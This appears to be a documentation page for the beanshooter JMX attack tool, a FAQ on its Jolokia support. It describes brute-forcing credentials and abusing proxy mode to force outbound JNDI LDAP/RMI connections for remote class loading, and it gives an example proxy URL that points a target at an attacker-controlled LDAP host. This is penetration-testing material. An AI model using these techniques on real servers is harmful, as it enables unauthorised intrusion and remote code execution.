### Jolokia

----

Starting from *v4.0.0*, *beanshooter* supports [Jolokia](https://github.com/rhuss/jolokia) based *JMX* endpoints.
Since *Jolokia* is a little bit different from the more common *RMI* based *JMX* endpoints, we created a short
*FAQ* to tell you what is possible with *Jolokia* and what is not.

Before the start with the *FAQ* here is a short listing of *Jolokia* related *beanshooter* options:

* `--jolokia`: instructs beanshooter to treat the specified target as *Jolokia* endpoint.
* `--jolokia-endpoint <STRING>`: by default *beanshooter* uses the *HTTP* endpoint `/jolokia/`. This option can be used to overwrite.
* `--ssl`: connect via *HTTPS*.
* `--jolokia-proxy <URL>`: service URL of JMX server to proxy to (e.g. `service:jmx:rmi:///jndi/rmi://172.17.0.1:1337/jmxrmi`).
* `--jolokia-proxy-user <USER>`: username for accessing authenticated proxy *JMX* servers.
* `--jolokia-proxy-password <PASS>`: password for accessing authenticated proxy *JMX* servers.


### FAQ

----

> **Q:** What is *Jolokia*?

**A**: [Jolokia](https://github.com/rhuss/jolokia) is an agent based *JMX* connector that allows accessing *JMX MBeans*
via *HTTP*. This is different from regular *JMX* connectors, that are usually based on *Java RMI* and tightly
integrated into the *Java* distribution itself. *Jolokia* can be accessed like an *REST API* and uses *JSON* over
*HTTP(S)* to transport information. The agent component converts incoming requests to *MBean* calls and returns
the call result back to the client. This makes it easy to interface with *JMX* from other programming languages
and allows easier firewall setups as for *RMI*.

> **Q:** Is the feature set of *Jolokia* equivalent to *RMI* based *JMX*?

**A**: No. Despite most *MBean* related operations work flawlessly with *Jolokia*, there are some restrictions.
The most obvious one is that *Jolokia* does not support the creation or the removal of *MBeans*. The corresponding
`cretaeMBean` and `unregisterMBean` methods are not implemented by the agent component and clients are not able
to call them. Moreover, *Jolokia* only supports method invocations that use [OpenTypes](https://docs.oracle.com/javase/7/docs/api/javax/management/openmbean/OpenType.html),
a limited set of simple *Java* types that can be represented by other programming languages. Method invocations with
arbitrary *Java* objects are therefore not possible.

> **Q:** What *beanshooter* operations are supported for *Jolokia* endpoints?

**A**: All operations that do not require the creation or removal of *MBeans* or the transport of complex *Java* types.
In essence, this means that the `deploy`, `undeploy` and `serial` actions are not supported. All other operations are
supported, as long as the only utilize *OpenTypes*, but this should be the case for most actions.

> **Q:** Can I use the *TonkaBean* via *Jolokia*?

**A**: Technically, you can use it, but most likely you cannot deploy it. With *v4.0.0* we made all methods exposed
by the *TonkaBean* *OpenType* conform. This means that an already deployed *TonkaBean* can be utilized via *Jolokia*.
However, the *TonkaBean* is usually deployed via the *MLet MBean*, which is usually not deployed per default and needs
to be created via `createMBean`. Since this is not possible via *Jolokia*, it is unlikely that you can deploy a *TonkaBean*.
That being said, it is not impossible. If the *MLet MBean* is already available on the target, you can use *beannshooters*
`mlet load` action to deploy a *TonkaBean*.

> **Q:** Does *Jolokia* use authentication?

**A**: It might. Authentication can be configured during the agent setup. If configured, *Jolokia* uses *HTTP Basic Auth*.
You can bruteforce credentials using *beanshooters* `brute` action, but be aware that this can lead to account locks on
newer *JMX* endpoints. Whether authentication is possible can be enumerated using *beanshooters* `enum` action.

> **Q:** What is *Jolokia Proxy Mode*?

**A**: *Jolokia* can be configured as a bridge between *HTTP* based clients and *RMI based JMX* services. In this mode,
*Jolokia* converts incoming *HTTP* requests to *RMI* calls and forwards them to the *RMI based JMX* service. One particular
interesting detail about *Proxy Mode* is that the target *RMI based JMX* service is client specified.

> **Q:** Can I abuse *Jolokia* running in *Proxy Mode*?

**A**: Sometimes. there are basically three scenarios you can profit from:

1. By connecting to *RMI based JMX* services in the backend that may be exploitable.
2. By forcing an outbound *JNDI LDAP based* connection that may allows to exploit remote class loading (*log4shell vector).
   It is worth noting that *Jolokia* supports allow and deny lists for proxy destinations. *JNDI LDAP based* service URLs
   are on the deny list per default. That being said [bypasses](https://github.com/rhuss/jolokia/pull/543) may exist.
3. By forcing an outbound *JNDI RMI based* connection that may allows deserialization attacks (*log4shell vector).

Apart from that, *Proxy Mode* could be useful to enumerate the presence of other services in the backend.

> **Q:** How does *beanshooter* compare to [Jolokia Exploitation Toolkit](https://github.com/laluka/jolokia-exploitation-toolkit)?

**A:** *Jolokia Exploitation Toolkit* is a great collection of possible techniques to abuse *Jolokia*. Most of these techniques
are even relevant for regular *RMI based JMX* when deploying *MBeans* is not possible due to permission or firewall restrictions.
Therefore, most of these techniques have already been implemented by *beanshooter* and are now also available when targeting
*Jolokia* with *beanshooter*. Some of them are only implicitly available. E.g. you can trigger an outbound *JNDI LDAP based* connection
by using `--jolokia-proxy service:jmx:Rmi:///jndi/ldap://172.17.0.1:1337/ups`.
